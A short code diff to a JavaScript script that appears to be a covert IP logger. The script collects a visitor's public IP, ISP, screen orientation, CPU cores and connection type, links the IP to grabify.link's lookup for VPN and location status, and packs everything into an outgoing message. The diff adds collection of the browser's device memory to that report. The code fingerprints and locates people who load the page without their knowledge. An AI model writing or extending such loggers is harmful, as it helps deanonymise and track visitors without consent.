@@ -207,6 +207,29 @@ function getConnection() {
 
 
 
+
+
+
+function getDeviceMemory() {
+  try {
+    if (navigator.deviceMemory) {
+      return navigator.deviceMemory + " GB";
+    } else {
+      return "N/A";
+    }
+  } catch (error) {
+    console.error("Error getting device memory:", error);
+    return "N/A";
+  }
+}
+
+
+
+
+
+
+	
+
 async function logIP() {
 try {
 const ip = await getPublicIPAddress();
@@ -265,6 +288,10 @@ const isp = await getISP(ip)
 
 
 const logicalCores = navigator.hardwareConcurrency;
+const ram = getDeviceMemory()
+
+
+
 	
 connectionType = getConnection();
 
@@ -295,6 +322,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Orientation: ${orientation}
 - Logical CPU Cores: ${logicalCores}
 - Internet Connection Type: ${connectionType}
+- RAM (available to browser): ${ram}
 `;
 
 const msg = {
